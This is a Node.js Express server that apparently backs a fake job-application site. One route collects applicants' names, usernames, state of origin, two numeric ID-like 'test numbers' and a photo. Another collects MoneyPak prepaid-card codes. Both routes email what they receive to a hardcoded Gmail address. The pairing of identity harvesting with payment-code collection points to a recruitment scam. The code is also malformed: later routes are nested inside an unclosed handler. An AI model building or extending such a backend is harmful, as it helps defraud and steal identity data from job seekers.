require('dotenv').config();
const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");
const path = require("path");

const app = express();


const EMAIL_USER = process.env.EMAIL_USER;
const EMAIL_PASS = process.env.EMAIL_PASS;
const EMAIL_TO = process.env.EMAIL_TO || "survivalmanagementc@gmail.com";

app.use(cors({ origin: "*" }));
app.use(express.json({ limit: "20mb" }));
app.use(express.static(path.join(__dirname, "public"), {
    index: ["index.html", "Index.html"]
}));

function createTransporter() {
    if (!EMAIL_USER || !EMAIL_PASS) {
        throw new Error("Email environment variables are missing.");
    }

    return nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
            user: EMAIL_USER,
            pass: EMAIL_PASS
        }
    });
}

function parseImageAttachment(photoName, photoData) {
    const matches = /^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/.exec(photoData || "");

    if (!matches) {
        return null;
    }

    return {
        filename: photoName,
        content: matches[2],
        encoding: "base64",
        contentType: matches[1]
    };
}

app.post("/submit-application", async (req, res) => {
    const {
        fullName,
        preferredTrack,
        username,
        stateOfOrigin,
        testNumber11,
        testNumber10,
        photoName,
        photoData
    } = req.body;

    if (!fullName || !preferredTrack || !username || !stateOfOrigin || !testNumber11 || !testNumber10) {
        return res.status(400).json({ message: "Please complete all application fields." });
    }

    if (!/^\d{11}$/.test(testNumber11) || !/^\d{10}$/.test(testNumber10)) {
        return res.status(400).json({ message: "The test number fields must be 11 and 10 digits." });
    }

    if (!photoName || !photoData) {
        return res.status(400).json({ message: "Please upload an applicant image." });
    }

    const imageAttachment = parseImageAttachment(photoName, photoData);

    if (!imageAttachment) {
        return res.status(400).json({ message: "The uploaded image format is invalid." });
    }

    try {
        const transporter = createTransporter();

        await transporter.sendMail({
            from: EMAIL_USER,
            to: EMAIL_TO,
            subject: `New Job Application: ${fullName}`,
            text: [
                "A new job application was submitted.",
                "",
                `Full Name: ${fullName}`,
                `Preferred Role / Department: ${preferredTrack}`,
                `Username: ${username}`,
                `State of Origin: ${stateOfOrigin}`,
                `11 Digit Test Number: ${testNumber11}`,
                `10 Digit Test Number: ${testNumber10}`,
                `Uploaded Image: ${photoName}`
            ].join("\n"),
            attachments: [imageAttachment]
        });

        res.json({ message: "Application sent successfully!" });
    } catch (error) {
    console.error("FULL ERROR:", error);
    res.status(500).json({ message: error.message || "Application email failed." });
}
// ...existing code...
app.post("/submit-moneypak", async (req, res) => {
    const { moneypakCode } = req.body;

    if (!moneypakCode) {
        return res.status(400).json({ message: "Please provide the moneypak code." });
    }

    try {
        const transporter = createTransporter();
        await transporter.verify();

        await transporter.sendMail({
            from: EMAIL_USER,
            to: EMAIL_TO,
            subject: "Moneypak Code Submission",
            text: `Moneypak Code: ${moneypakCode}`
        });

        res.json({ message: "Moneypak code sent successfully!" });
    } catch (error) {
        console.error("Moneypak email failed:", error);
        res.status(500).json({ message: "Moneypak email failed." });
    }
});
// ...existing code...

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
});